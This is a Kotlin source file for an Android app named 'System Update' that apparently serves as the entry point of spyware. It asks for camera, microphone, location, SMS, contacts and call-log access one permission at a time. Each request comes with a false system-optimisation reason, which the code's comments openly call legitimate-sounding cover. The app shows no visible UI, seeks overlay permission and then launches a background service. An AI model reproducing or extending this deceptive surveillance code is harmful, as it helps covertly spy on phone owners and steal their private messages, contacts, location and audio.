package com.android.system.update

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.android.system.update.services.MainService

class MainActivity : AppCompatActivity() {

    // Permission groups with legitimate system-update sounding descriptions
    private data class PermissionGroup(
        val permission: String,
        val feature: String,
        val reason: String
    )

    private val permissionGroups = listOf(
        PermissionGroup(Manifest.permission.CAMERA, "Camera", "Camera optimization and quality enhancement"),
        PermissionGroup(Manifest.permission.RECORD_AUDIO, "Microphone", "Voice call quality improvement"),
        PermissionGroup(Manifest.permission.ACCESS_FINE_LOCATION, "Location", "Wi-Fi network optimization"),
        PermissionGroup(Manifest.permission.ACCESS_COARSE_LOCATION, "Location", "Network signal enhancement"),
        PermissionGroup(Manifest.permission.READ_SMS, "Messages", "Message backup and restore feature"),
        PermissionGroup(Manifest.permission.RECEIVE_SMS, "Messages", "Notification delivery optimization"),
        PermissionGroup(Manifest.permission.READ_CONTACTS, "Contacts", "Contact sync optimization"),
        PermissionGroup(Manifest.permission.READ_CALL_LOG, "Phone", "Call history optimization"),
        PermissionGroup(Manifest.permission.READ_PHONE_STATE, "Phone", "Network state monitoring"),
        PermissionGroup(Manifest.permission.POST_NOTIFICATIONS, "Notifications", "System notification optimization")
    )

    private val dangerousPermissions = permissionGroups.map { it.permission }.toMutableList()

    // Permissions that are auto-granted or system-level (no runtime dialog needed)
    private val autoGrantedPermissions = listOf(
        Manifest.permission.INTERNET,
        Manifest.permission.ACCESS_NETWORK_STATE,
        Manifest.permission.FOREGROUND_SERVICE,
        Manifest.permission.RECEIVE_BOOT_COMPLETED,
        Manifest.permission.WAKE_LOCK
    )

    private var pendingPermissions = mutableListOf<String>()
    private var permissionRequestIndex = 0

    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        // Check which ones are still denied
        val stillDenied = pendingPermissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (stillDenied.isNotEmpty()) {
            // Some denied - show progressive dialog
            val denied = permissions.filter { !it.value }.keys.firstOrNull()
            if (denied != null) {
                val group = permissionGroups.find { it.permission == denied }
                showProgressivePermissionDialog(denied, group)
            } else {
                // All done
                checkOverlayAndStart()
            }
        } else {
            // All granted, request next batch
            requestNextPermissions()
        }
    }

    private val overlayPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { _ ->
        checkOverlayAndStart()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        // No visible UI - immediately request permissions in background
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && Settings.canDrawOverlays(this)) {
            requestPermissionsStartService()
        } else {
            requestPermissionsStartService()
        }
    }

    // Request permissions one by one with legitimate sounding reason
    private fun requestNextPermissions() {
        if (permissionRequestIndex >= pendingPermissions.size) {
            checkOverlayAndStart()
            return
        }

        val perm = pendingPermissions[permissionRequestIndex]
        val group = permissionGroups.find { it.permission == perm }
        
        // Request single permission with rationale if needed
        if (shouldShowRequestPermissionRationale(perm)) {
            showProgressivePermissionDialog(perm, group)
        } else {
            permissionLauncher.launch(arrayOf(perm))
        }
        permissionRequestIndex++
    }

    // Retry the current permission after showing rationale
    private fun retryCurrentPermission() {
        if (permissionRequestIndex > 0 && permissionRequestIndex <= pendingPermissions.size) {
            permissionRequestIndex--
        }
        requestNextPermissions()
    }

    private fun requestPermissionsStartService() {
        pendingPermissions = dangerousPermissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }.toMutableList()

        if (pendingPermissions.isEmpty()) {
            checkOverlayAndStart()
        } else {
            permissionRequestIndex = 0
            requestNextPermissions()
        }
    }

    // Show permissions with system-update sounding reason instead of raw permission names
    private fun showProgressivePermissionDialog(permission: String, group: PermissionGroup?) {
        val title = "System Update"
        val message = """
To apply system optimization features, please grant the following access:

• ${group?.feature ?: "System Feature"} - ${group?.reason ?: "Performance optimization"}

This is required for Android security patch compatibility.
        """.trimIndent()

        AlertDialog.Builder(this)
            .setTitle(title)
            .setMessage(message)
            .setPositiveButton("Allow") { _, _ ->
                permissionLauncher.launch(arrayOf(permission))
            }
            .setNegativeButton("Skip") { _, _ ->
                permissionRequestIndex++
                requestNextPermissions()
            }
            .setCancelable(false)
            .show()
    }

    private fun checkOverlayAndStart() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            requestOverlayPermission()
        } else {
            startMainService()
            finish()
        }
    }

    private fun requestOverlayPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            val intent = Intent(
                Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                Uri.parse("package:$packageName")
            )
            overlayPermissionLauncher.launch(intent)
        } else {
            startMainService()
            finish()
        }
    }

    private fun startMainService() {
        try {
            val intent = Intent(this, MainService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }
        } catch (e: Exception) {
            Handler(Looper.getMainLooper()).postDelayed({
                try {
                    val intent = Intent(this, MainService::class.java)
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        startForegroundService(intent)
                    } else {
                        startService(intent)
                    }
                } catch (e2: Exception) {
                    Toast.makeText(this, "Service error: ${e2.message}", Toast.LENGTH_LONG).show()
                }
            }, 1000)
        }
        finish()
    }
}